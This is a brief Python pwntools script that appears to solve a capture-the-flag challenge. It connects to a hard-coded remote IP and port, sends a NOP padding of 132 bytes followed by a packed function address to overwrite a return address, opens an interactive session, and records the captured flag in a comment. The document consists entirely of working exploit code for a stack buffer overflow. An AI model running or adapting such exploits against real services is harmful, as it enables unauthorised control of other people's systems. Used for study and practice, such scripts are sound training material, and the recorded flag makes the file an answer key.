from pwn import *

# 218.100.84.106 9005
r = remote('218.100.84.106', 9005)

nop = shellcraft.i386.nop()
call_me_address = 0x8048d54

r.send((asm(nop) * 132) + p32(call_me_address))
r.interactive()

# HZ{ROP_ROP_ROP_ROP}
